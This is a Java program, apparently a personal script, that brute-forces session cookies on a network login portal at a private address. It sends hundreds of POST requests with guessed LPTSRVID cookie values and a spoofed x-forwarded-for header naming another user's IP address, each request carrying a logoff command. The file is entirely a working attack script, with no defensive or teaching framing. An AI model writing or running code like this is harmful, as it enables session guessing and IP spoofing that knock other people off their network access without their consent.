//package com.simon.web;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
public class HttpReq {

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		int lines;
		String cookie ="125200";
		for(int cnum=4000;cnum<4900;cnum++)
		{
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			HttpReq.sendPost("http://172.16.222.251/portal/logon.cgi","10.168.8.141",cnum,"PtButton=Logoff");	
			//HttpReq.sendPost("http://172.16.222.251/portal/logon.cgi","10.168.8.83",cnum,"PtButton=Logoff");
		}
		//System.out.println(cookie);
	     	//HttpReq.sendPost("http://172.16.222.251/portal/logon.cgi","10.168.8.127",4215,"PtButton=Logoff");
		//String sr2 = HttpReq.sendPost("http://172.16.222.251/portal/logon.cgi","10.168.8.141",4213,"PtButton=Logoff");
		
	}
	
	public static int sendPost(String url,String ip,int cookie_num,String parm){
		int num=0;
		PrintWriter out = null;
		BufferedReader in = null;
		String result = "";
		String cookie = "";
		cookie +="LPTSRVID=125200"+cookie_num;
		System.out.println(cookie);
		try {
			URL requrl = new URL(url);
				URLConnection conn = requrl.openConnection();
				conn.setRequestProperty("host","172.16.222.251");
				conn.setRequestProperty("connection","keep-alive");
				conn.setRequestProperty("content-length	","15");
				conn.setRequestProperty("cache-control","max-age=0");
				conn.setRequestProperty("accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
				conn.setRequestProperty("origin","http://172.16.222.251"	);
				conn.setRequestProperty("user-agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 BIDUBrowser/6.x Safari/537.31");
				conn.setRequestProperty("content-type","application/x-www-form-urlencoded");
				conn.setRequestProperty("referer","http://172.16.222.251/portal/logon.cgi");
				conn.setRequestProperty("accept-encoding","gzip,deflate");
				conn.setRequestProperty("accept-language","zh-CN,zh;q=0.8");
				conn.setRequestProperty("accept-charset","iso-8859-1,*,utf-8");
				//conn.setRequestProperty("cookie","LPTSRVID=1252004215");
				conn.setRequestProperty("cookie",cookie);
				//conn.setRequestProperty("x-forwarded-for","10.168.8.141");
				conn.setRequestProperty("x-forwarded-for",ip);
				conn.setDoInput(true);
				conn.setDoOutput(true);
				out = new PrintWriter(conn.getOutputStream());
				out.print(parm);
				out.flush();
				in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
				String line;
				while((line=in.readLine())!=null){
					num++;
					result+=line;
				}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.out.println(num);
		return num;
	}

}
